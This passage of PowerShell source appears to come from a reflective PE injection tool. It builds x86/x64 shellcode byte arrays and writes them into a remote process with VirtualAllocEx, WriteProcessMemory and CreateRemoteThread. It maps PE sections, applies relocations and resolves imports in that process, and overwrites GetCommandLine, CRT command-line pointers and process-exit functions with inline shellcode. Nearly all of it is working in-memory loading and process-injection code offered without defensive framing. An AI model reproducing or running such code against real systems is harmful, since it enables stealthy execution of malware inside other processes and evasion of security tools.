			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem

		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)

		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}

		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}


		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])


		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }

		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)


			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))





			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}

			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}

			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}


			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		[Int64]$BaseDifference = 0
		$AddDifference = $true
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)


		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}


		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{

			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2


			for($i = 0; $i -lt $NumRelocations; $i++)
			{

				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])


				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}




				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{

					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])

					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{

					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}

			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)

		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}

		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)


				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)

				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}


				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics)
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero



					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}

					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}

					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)

					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])



                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)

		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}

		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}

		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)

			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize

			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}



	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,

		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)


		$ReturnArray = @()

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0

		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}

		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}




		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)

		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}


		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48
		}
		$Shellcode1 += 0xb8

		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length



		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)


		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}

		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp

		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null



		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}

		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp

		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null








		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}

				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)


				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)

				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null

				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}






		$ReturnArray = @()
		$ExitFunctions = @()


		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr


		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr

		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr


			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)

			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length

			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
